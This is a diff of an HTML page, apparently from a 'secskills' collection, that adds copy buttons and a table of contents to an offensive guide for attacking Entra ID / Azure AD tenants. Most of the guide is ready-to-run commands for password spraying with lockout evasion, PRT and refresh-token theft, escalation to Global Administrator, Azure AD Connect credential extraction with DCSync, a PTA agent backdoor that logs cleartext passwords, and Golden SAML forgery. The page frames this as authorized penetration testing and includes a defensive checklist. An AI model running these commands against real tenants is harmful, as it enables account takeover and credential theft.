@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,12 +47,13 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Attack and enumerate Azure AD / Entra ID tenants — initial recon with AADInternals and ROADtools, password spraying, token theft (PRT, CAE, refresh tokens), application and service principal abuse, Conditional Access bypass, cross-tenant pivoting, hybrid identity attacks (PTA agent, Azure AD Connect), and managed identity abuse. Use when pentesting Entra ID tenants, assessing Azure AD security posture, or exploiting cloud identity misconfigurations.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>Entra ID (formerly Azure AD) is the identity control plane for Microsoft 365, Azure, and thousands of SaaS integrations. Compromising it grants access to everything those identities protect: mailboxes, SharePoint, Azure subscriptions, and any application that trusts the tenant. Despite this, Entra ID environments are routinely less monitored than on-premises Active Directory. Most organizations lack equivalent detection coverage for cloud identity attacks, and the attack surface -- OAuth tokens, application consent, service principals, Conditional Access gaps -- is fundamentally different from traditional AD.</p>
+<div class="wrap slayout"><article><p>Entra ID (formerly Azure AD) is the identity control plane for Microsoft 365, Azure, and thousands of SaaS integrations. Compromising it grants access to everything those identities protect: mailboxes, SharePoint, Azure subscriptions, and any application that trusts the tenant. Despite this, Entra ID environments are routinely less monitored than on-premises Active Directory. Most organizations lack equivalent detection coverage for cloud identity attacks, and the attack surface -- OAuth tokens, application consent, service principals, Conditional Access gaps -- is fundamentally different from traditional AD.</p>
 <p>Only against tenants you are authorized to test.</p>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Entra ID tenant reconnaissance and enumeration</li>
 <li>Password spraying against Microsoft 365 / Azure AD endpoints</li>
@@ -50,7 +62,7 @@
 <li>Bypassing Conditional Access policies</li>
 <li>Hybrid identity attacks (Azure AD Connect, PTA agents)</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>On-premises Active Directory attacks</strong> (Kerberoasting, DCSync, lateral</li>
 </ul>
@@ -63,9 +75,26 @@
 <li><strong>AD CS certificate abuse</strong> -- use <a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a></li>
 <li><strong>Detecting these attacks defensively</strong> -- use <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a></li>
 </ul>
-<h2>Initial Reconnaissance</h2>
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
 <p>Tenant discovery requires no credentials. Start here to confirm the target tenant exists, identify federation configuration, and map the attack surface.</p>
-<pre><code># AADInternals -- tenant recon
+<div class="codeblk cx"><button class="copy" data-copy="# AADInternals -- tenant recon
+Import-Module AADInternals
+Invoke-AADIntReconAsOutsider -DomainName target.com
+
+# Get tenant ID from OpenID configuration
+curl https://login.microsoftonline.com/target.com/.well-known/openid-configuration
+
+# Check user realm (managed vs. federated)
+curl &quot;https://login.microsoftonline.com/common/userrealm/user@target.com?api-version=2.0&quot;
+
+# ROADtools -- authenticated enumeration (once you have creds)
+roadrecon auth -u user@target.com -p &#x27;Password&#x27;
+roadrecon gather
+roadrecon gui
+# Browse the GUI: users, groups, applications, service principals, conditional access
+
+# AzureHound -- BloodHound collection for Azure/Entra
+azurehound -u user@target.com -p &#x27;Password&#x27; list --tenant target.com -o output.json">copy</button><pre><code># AADInternals -- tenant recon
 Import-Module AADInternals
 Invoke-AADIntReconAsOutsider -DomainName target.com
 
@@ -82,11 +111,21 @@ roadrecon gui
 # Browse the GUI: users, groups, applications, service principals, conditional access
 
 # AzureHound -- BloodHound collection for Azure/Entra
-azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json</code></pre>
+azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json</code></pre></div>
 <p>ROADtools GUI is the single most useful view of a tenant. Run <code>roadrecon gather</code> immediately after obtaining any valid credential.</p>
-<h2>Password Spraying</h2>
+<h2 id="password-spraying">Password Spraying</h2>
 <p>Microsoft rate-limits and logs sprays, so cadence matters. One password per user per 30-60 minutes avoids smart lockout in most configurations.</p>
-<pre><code># MSOLSpray -- targets the Microsoft Online login endpoint
+<div class="codeblk cx"><button class="copy" data-copy="# MSOLSpray -- targets the Microsoft Online login endpoint
+Import-Module MSOLSpray.ps1
+Invoke-MSOLSpray -UserList users.txt -Password &#x27;Spring2026!&#x27; -URL https://login.microsoft.com
+
+# o365spray -- enumerate then spray
+o365spray --validate --domain target.com
+o365spray --enum -U users.txt --domain target.com
+o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com --rate 1 --safe 30
+
+# TREVORspray -- distributed spraying via SOCKS proxies
+trevorspray -u users.txt -p &#x27;Summer2026!&#x27; --delay 1800">copy</button><pre><code># MSOLSpray -- targets the Microsoft Online login endpoint
 Import-Module MSOLSpray.ps1
 Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!' -URL https://login.microsoft.com
 
@@ -96,7 +135,7 @@ o365spray --enum -U users.txt --domain target.com
 o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com --rate 1 --safe 30
 
 # TREVORspray -- distributed spraying via SOCKS proxies
-trevorspray -u users.txt -p 'Summer2026!' --delay 1800</code></pre>
+trevorspray -u users.txt -p 'Summer2026!' --delay 1800</code></pre></div>
 <p>Lockout-safe cadence:</p>
 <ul>
 <li>One attempt per user per 30 minutes minimum</li>
@@ -105,11 +144,11 @@ trevorspray -u users.txt -p 'Summer2026!' --delay 1800</code></pre>
 <li>Monitor for <code>AADSTS50053</code> (locked) and <code>AADSTS50126</code> (invalid password) to</li>
 </ul>
 <p>distinguish lockout from failure</p>
-<h2>Token Theft and Replay</h2>
+<h2 id="token-theft-and-replay">Token Theft and Replay</h2>
 <p>Entra ID authentication produces several token types. Each has different lifetimes, scopes, and replay conditions.</p>
 <h3>Primary Refresh Token (PRT)</h3>
 <p>The PRT is a long-lived credential cached on Azure AD joined or registered devices. It grants SSO to all Microsoft cloud services.</p>
-<pre><code># Extract PRT using ROADtoken (requires SYSTEM or user session)
+<div class="codeblk cx"><button class="copy" data-copy="# Extract PRT using ROADtoken (requires SYSTEM or user session)
 ROADtoken.exe
 
 # RequestAADRefreshToken -- request a refresh token using the PRT
@@ -117,19 +156,33 @@ RequestAADRefreshToken.exe
 
 # AADInternals -- export PRT from a joined device
 $prt = Get-AADIntUserPRTToken
-# Use it in a browser by injecting the x-ms-RefreshTokenCredential cookie</code></pre>
+# Use it in a browser by injecting the x-ms-RefreshTokenCredential cookie">copy</button><pre><code># Extract PRT using ROADtoken (requires SYSTEM or user session)
+ROADtoken.exe
+
+# RequestAADRefreshToken -- request a refresh token using the PRT
+RequestAADRefreshToken.exe
+
+# AADInternals -- export PRT from a joined device
+$prt = Get-AADIntUserPRTToken
+# Use it in a browser by injecting the x-ms-RefreshTokenCredential cookie</code></pre></div>
 <p>A stolen PRT bypasses MFA if MFA was satisfied when the PRT was issued, because the PRT carries the MFA claim.</p>
 <h3>Refresh Token Replay</h3>
-<pre><code># Exchange a refresh token for an access token
+<div class="codeblk cx"><button class="copy" data-copy="# Exchange a refresh token for an access token
+curl -X POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token \
+  -d &quot;client_id=CLIENT_ID&amp;grant_type=refresh_token&amp;refresh_token=STOLEN_RT&amp;scope=https://graph.microsoft.com/.default&quot;
+
+# ROADtools -- authenticate with a refresh token
+roadrecon auth --refresh-token &#x27;eyJ0...&#x27;
+roadrecon gather">copy</button><pre><code># Exchange a refresh token for an access token
 curl -X POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token \
   -d "client_id=CLIENT_ID&amp;grant_type=refresh_token&amp;refresh_token=STOLEN_RT&amp;scope=https://graph.microsoft.com/.default"
 
 # ROADtools -- authenticate with a refresh token
 roadrecon auth --refresh-token 'eyJ0...'
-roadrecon gather</code></pre>
+roadrecon gather</code></pre></div>
 <h3>Continuous Access Evaluation (CAE) Gaps</h3>
 <p>CAE-aware tokens are checked against revocation in near real-time, but not all applications support CAE. Token lifetime for non-CAE resources remains up to 1 hour. Critical event evaluation (user disabled, password change) propagates within minutes, but IP-based evaluation covers only supported workloads. Check whether the target application enforces CAE before assuming token revocation is instantaneous.</p>
-<h2>Application and Service Principal Abuse</h2>
+<h2 id="application-and-service-principal-abuse">Application and Service Principal Abuse</h2>
 <p>Applications and service principals are the most under-reviewed attack surface in Entra ID. They persist through user offboarding, hold credentials that nobody rotates, and often have excessive API permissions.</p>
 <h3>Dangerous Application Permissions</h3>
 <p>Application (not delegated) permissions that grant tenant-wide access without user consent:</p>
@@ -143,17 +196,36 @@ roadrecon gather</code></pre>
 <li><code>Application.ReadWrite.All</code> -- modify any application registration</li>
 <li><code>Directory.ReadWrite.All</code> -- broad write across directory objects</li>
 </ul>
-<pre><code># Enumerate applications with high-privilege permissions (Graph API)
+<div class="codeblk cx"><button class="copy" data-copy="# Enumerate applications with high-privilege permissions (Graph API)
+az rest --method GET --url &quot;https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles&quot; \
+  --query &quot;value[].{name:displayName,appId:appId}&quot;
+
+# ROADtools -- the GUI shows app permissions under each service principal
+
+# Find apps with credentials (secrets/certificates)
+az ad app list --query &quot;[?passwordCredentials || keyCredentials].{name:displayName,appId:appId}&quot; -o table">copy</button><pre><code># Enumerate applications with high-privilege permissions (Graph API)
 az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles" \
   --query "value[].{name:displayName,appId:appId}"
 
 # ROADtools -- the GUI shows app permissions under each service principal
 
 # Find apps with credentials (secrets/certificates)
-az ad app list --query "[?passwordCredentials || keyCredentials].{name:displayName,appId:appId}" -o table</code></pre>
+az ad app list --query "[?passwordCredentials || keyCredentials].{name:displayName,appId:appId}" -o table</code></pre></div>
 <h3>Consent Grant Abuse (Illicit Consent Grant)</h3>
 <p>If users can consent to applications, an attacker can register a malicious multi-tenant app requesting Mail.Read and similar scopes, then phish a user into granting consent.</p>
-<pre><code># Microsoft Graph PowerShell. The AzureAD and MSOnline modules are gone --
+<div class="codeblk cx"><button class="copy" data-copy="# Microsoft Graph PowerShell. The AzureAD and MSOnline modules are gone --
+# deprecated March 2024, unsupported after 30 March 2025, retired from
+# July 2025 -- so any Get-AzureAD*/Get-Msol* command you find in older
+# tradecraft will simply fail to authenticate.
+Connect-MgGraph -Scopes &#x27;Policy.Read.All&#x27;,&#x27;Application.Read.All&#x27;
+
+# Check whether user consent is allowed
+(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned
+# If &quot;ManagePermissionGrantsForSelf.microsoft-user-default-legacy&quot; is present,
+# users can consent to third-party apps
+
+# Enumerate existing consent grants
+Get-MgOauth2PermissionGrant -All">copy</button><pre><code># Microsoft Graph PowerShell. The AzureAD and MSOnline modules are gone --
 # deprecated March 2024, unsupported after 30 March 2025, retired from
 # July 2025 -- so any Get-AzureAD*/Get-Msol* command you find in older
 # tradecraft will simply fail to authenticate.
@@ -165,15 +237,19 @@ Connect-MgGraph -Scopes 'Policy.Read.All','Application.Read.All'
 # users can consent to third-party apps
 
 # Enumerate existing consent grants
-Get-MgOauth2PermissionGrant -All</code></pre>
+Get-MgOauth2PermissionGrant -All</code></pre></div>
 <h3>App Role Assignment Escalation</h3>
 <p>If you control a service principal with <code>AppRoleAssignment.ReadWrite.All</code>:</p>
-<pre><code># Grant RoleManagement.ReadWrite.Directory to your controlled SP
+<div class="codeblk cx"><button class="copy" data-copy="# Grant RoleManagement.ReadWrite.Directory to your controlled SP
+az rest --method POST \
+  --url &quot;https://graph.microsoft.com/v1.0/servicePrincipals/SP_OBJECT_ID/appRoleAssignments&quot; \
+  --body &#x27;{&quot;principalId&quot;:&quot;SP_OBJECT_ID&quot;,&quot;resourceId&quot;:&quot;GRAPH_SP_ID&quot;,&quot;appRoleId&quot;:&quot;ROLE_MANAGEMENT_ROLE_ID&quot;}&#x27;
+# Then assign Global Administrator to any user or SP">copy</button><pre><code># Grant RoleManagement.ReadWrite.Directory to your controlled SP
 az rest --method POST \
   --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP_OBJECT_ID/appRoleAssignments" \
   --body '{"principalId":"SP_OBJECT_ID","resourceId":"GRAPH_SP_ID","appRoleId":"ROLE_MANAGEMENT_ROLE_ID"}'
-# Then assign Global Administrator to any user or SP</code></pre>
-<h2>Conditional Access Bypass</h2>
+# Then assign Global Administrator to any user or SP</code></pre></div>
+<h2 id="conditional-access-bypass">Conditional Access Bypass</h2>
 <p>Conditional Access (CA) policies are the primary security control in Entra ID, but gaps are common.</p>
 <p><strong>Common bypass patterns:</strong></p>
 <ul>
@@ -200,17 +276,31 @@ az rest --method POST \
 <li><strong>CAE vs. non-CAE resources</strong> -- revocation signals do not reach non-CAE</li>
 </ul>
 <p>applications in real time</p>
-<pre><code># Enumerate CA policies (requires Policy.Read.All or equivalent)
+<div class="codeblk cx"><button class="copy" data-copy="# Enumerate CA policies (requires Policy.Read.All or equivalent)
+az rest --method GET --url &quot;https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies&quot;
+
+# ROADtools -- CA policies are visible in the GUI after gathering
+
+# Test legacy auth (if not blocked)
+curl -u user@target.com:password https://outlook.office365.com/EWS/Exchange.asmx">copy</button><pre><code># Enumerate CA policies (requires Policy.Read.All or equivalent)
 az rest --method GET --url "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies"
 
 # ROADtools -- CA policies are visible in the GUI after gathering
 
 # Test legacy auth (if not blocked)
-curl -u user@target.com:password https://outlook.office365.com/EWS/Exchange.asmx</code></pre>
-<h2>Cross-Tenant Attacks</h2>
+curl -u user@target.com:password https://outlook.office365.com/EWS/Exchange.asmx</code></pre></div>
+<h2 id="cross-tenant-attacks">Cross-Tenant Attacks</h2>
 <h3>B2B Guest Pivoting</h3>
 <p>Guest accounts in one tenant often have access to resources in the inviting tenant. If you compromise a user who is a guest in another tenant, enumerate what that guest can reach.</p>
-<pre><code># List tenants the compromised user is a guest in
+<div class="codeblk cx"><button class="copy" data-copy="# List tenants the compromised user is a guest in
+az account list --all --query &quot;[].{tenant:tenantId,name:name}&quot;
+
+# Switch context to the target tenant
+az login --tenant TARGET_TENANT_ID
+
+# Enumerate accessible resources in the target tenant
+az ad signed-in-user show
+az group list">copy</button><pre><code># List tenants the compromised user is a guest in
 az account list --all --query "[].{tenant:tenantId,name:name}"
 
 # Switch context to the target tenant
@@ -218,7 +308,7 @@ az login --tenant TARGET_TENANT_ID
 
 # Enumerate accessible resources in the target tenant
 az ad signed-in-user show
-az group list</code></pre>
+az group list</code></pre></div>
 <h3>Tenant-to-Tenant Trust Abuse</h3>
 <p>Cross-tenant access settings and cross-tenant synchronization can create trust paths:</p>
 <ul>
@@ -229,24 +319,32 @@ az group list</code></pre>
 <li>Cross-tenant sync pushing identities into the target -- if you control the</li>
 </ul>
 <p>source tenant's sync, you can inject accounts into the target</p>
-<pre><code># Enumerate cross-tenant access policies
-Get-MgPolicyCrossTenantAccessPolicyPartner | Select TenantId, InboundTrust, AutomaticUserConsentSettings</code></pre>
-<h2>Hybrid Identity Attacks</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Enumerate cross-tenant access policies
+Get-MgPolicyCrossTenantAccessPolicyPartner | Select TenantId, InboundTrust, AutomaticUserConsentSettings">copy</button><pre><code># Enumerate cross-tenant access policies
+Get-MgPolicyCrossTenantAccessPolicyPartner | Select TenantId, InboundTrust, AutomaticUserConsentSettings</code></pre></div>
+<h2 id="hybrid-identity-attacks">Hybrid Identity Attacks</h2>
 <p>Hybrid environments connect on-premises AD to Entra ID, creating attack paths in both directions.</p>
 <h3>Azure AD Connect -- Sync Account DCSync</h3>
 <p>Azure AD Connect uses a service account with Directory Replication permissions (DCSync rights) in on-premises AD. The credentials are stored encrypted on the Connect server.</p>
-<pre><code># AADInternals -- extract the sync account credentials from the Connect server
+<div class="codeblk cx"><button class="copy" data-copy="# AADInternals -- extract the sync account credentials from the Connect server
 # Requires local admin on the Azure AD Connect host
 Import-Module AADInternals
 Get-AADIntSyncCredentials
 # Returns: username (MSOL_xxxx or custom), password, tenant ID
 
 # Use the sync account to DCSync on-prem AD
-secretsdump.py 'MSOL_abc123:password@dc.domain.local' -just-dc</code></pre>
+secretsdump.py &#x27;MSOL_abc123:password@dc.domain.local&#x27; -just-dc">copy</button><pre><code># AADInternals -- extract the sync account credentials from the Connect server
+# Requires local admin on the Azure AD Connect host
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+# Returns: username (MSOL_xxxx or custom), password, tenant ID
+
+# Use the sync account to DCSync on-prem AD
+secretsdump.py 'MSOL_abc123:password@dc.domain.local' -just-dc</code></pre></div>
 <p>Compromising the Azure AD Connect server is a domain compromise. The sync account also has the ability to reset cloud passwords unless password writeback scope is restricted.</p>
 <h3>Pass-Through Authentication (PTA) Agent Abuse</h3>
 <p>PTA agents validate on-prem passwords for cloud logins. An attacker with admin access on the PTA agent host can intercept credentials in cleartext.</p>
-<pre><code># AADInternals -- install a PTA agent backdoor that logs credentials
+<div class="codeblk cx"><button class="copy" data-copy="# AADInternals -- install a PTA agent backdoor that logs credentials
 # and optionally accepts any password
 Install-AADIntPTASpy
 
@@ -254,31 +352,49 @@ Install-AADIntPTASpy
 Get-AADIntPTASpyLog
 
 # Remove the spy
-Remove-AADIntPTASpy</code></pre>
+Remove-AADIntPTASpy">copy</button><pre><code># AADInternals -- install a PTA agent backdoor that logs credentials
+# and optionally accepts any password
+Install-AADIntPTASpy
+
+# Retrieve intercepted credentials
+Get-AADIntPTASpyLog
+
+# Remove the spy
+Remove-AADIntPTASpy</code></pre></div>
 <p>Compromising any PTA agent host gives cleartext credentials for every cloud authentication by non-synced-hash users.</p>
 <h3>Federation Abuse (Golden SAML)</h3>
 <p>If ADFS is in use and you have the token-signing certificate:</p>
-<pre><code># Export the ADFS token-signing certificate (requires DA or local admin on ADFS)
+<div class="codeblk cx"><button class="copy" data-copy="# Export the ADFS token-signing certificate (requires DA or local admin on ADFS)
 # Then forge SAML tokens for any federated user
 # AADInternals:
 $cert = Export-AADIntADFSSigningCertificate
-Open-AADIntOffice365Portal -ImmutableID USER_IMMUTABLE_ID -Issuer FEDERATION_ISSUER -PfxFileName cert.pfx</code></pre>
-<h2>Managed Identity and Workload Identity Federation</h2>
+Open-AADIntOffice365Portal -ImmutableID USER_IMMUTABLE_ID -Issuer FEDERATION_ISSUER -PfxFileName cert.pfx">copy</button><pre><code># Export the ADFS token-signing certificate (requires DA or local admin on ADFS)
+# Then forge SAML tokens for any federated user
+# AADInternals:
+$cert = Export-AADIntADFSSigningCertificate
+Open-AADIntOffice365Portal -ImmutableID USER_IMMUTABLE_ID -Issuer FEDERATION_ISSUER -PfxFileName cert.pfx</code></pre></div>
+<h2 id="managed-identity-and-workload-identity-federation">Managed Identity and Workload Identity Federation</h2>
 <h3>Managed Identity Abuse</h3>
 <p>Azure managed identities (system-assigned and user-assigned) are service principals that Azure resources use to authenticate to other services.</p>
-<pre><code># From a compromised Azure VM/Function/App Service -- request a token
+<div class="codeblk cx"><button class="copy" data-copy="# From a compromised Azure VM/Function/App Service -- request a token
+curl -H Metadata:true \
+  &quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://graph.microsoft.com&quot;
+
+# Use the token against Graph API
+curl -H &quot;Authorization: Bearer ACCESS_TOKEN&quot; https://graph.microsoft.com/v1.0/me">copy</button><pre><code># From a compromised Azure VM/Function/App Service -- request a token
 curl -H Metadata:true \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://graph.microsoft.com"
 
 # Use the token against Graph API
-curl -H "Authorization: Bearer ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me</code></pre>
+curl -H "Authorization: Bearer ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me</code></pre></div>
 <p>If the managed identity has high-privilege Graph or ARM permissions, this is equivalent to a service principal compromise.</p>
 <h3>Workload Identity Federation</h3>
 <p>Workload identity federation allows external identity providers (GitHub Actions, GCP, AWS) to authenticate as an Entra ID service principal without secrets.</p>
 <p>Misconfiguration risk: overly broad subject/issuer conditions. If a federated credential trusts <code>repo:org/*</code> instead of <code>repo:org/specific-repo:ref:refs/heads/main</code>, any repo in the org can assume the identity.</p>
-<pre><code># Enumerate federated credentials on an application
-az ad app federated-credential list --id APP_OBJECT_ID</code></pre>
-<h2>Defensive Review Checklist</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Enumerate federated credentials on an application
+az ad app federated-credential list --id APP_OBJECT_ID">copy</button><pre><code># Enumerate federated credentials on an application
+az ad app federated-credential list --id APP_OBJECT_ID</code></pre></div>
+<h2 id="defensive-review-checklist">Defensive Review Checklist</h2>
 <p>When performing a security assessment rather than an attack:</p>
 <ul>
 <li>Are legacy authentication protocols blocked in all CA policies?</li>
@@ -296,7 +412,7 @@ az ad app federated-credential list --id APP_OBJECT_ID</code></pre>
 <li>Are workload identity federation subject conditions narrowly scoped?</li>
 <li>Is sign-in and audit log retention configured beyond the 7-day default?</li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"We have Conditional Access, so MFA is everywhere."</em> Check for legacy auth</li>
 </ul>
@@ -325,7 +441,7 @@ az ad app federated-credential list --id APP_OBJECT_ID</code></pre>
 <li><em>"Managed identities are more secure because there are no secrets to leak."</em></li>
 </ul>
 <p>True for credential theft, but any code running on the resource can request tokens. Overly permissioned managed identities are still a privilege escalation path.</p>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Initial Access</strong> (TA0001)</p>
 <ul>
@@ -338,11 +454,14 @@ az ad app federated-credential list --id APP_OBJECT_ID</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1606/002/">T1606.002</a> SAML Tokens — see also <a class="xref" href="attacking-saml.html"><code>attacking-saml</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a> -- on-premises AD attacks and lateral movement</li>
 <li><a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a> -- broader cloud platform exploitation (AWS, Azure, GCP)</li>
 <li><a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a> -- AD CS certificate abuse, including hybrid PKI scenarios</li>
 <li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- detection engineering for Entra ID sign-in and audit logs</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#initial-reconnaissance">Initial Reconnaissance</a><a href="#password-spraying">Password Spraying</a><a href="#token-theft-and-replay">Token Theft and Replay</a><a href="#application-and-service-principal-abuse">Application and Service Principal Abuse</a><a href="#conditional-access-bypass">Conditional Access Bypass</a><a href="#cross-tenant-attacks">Cross-Tenant Attacks</a><a href="#hybrid-identity-attacks">Hybrid Identity Attacks</a><a href="#managed-identity-and-workload-identity-federation">Managed Identity and Workload Identity Federation</a><a href="#defensive-review-checklist">Defensive Review Checklist</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
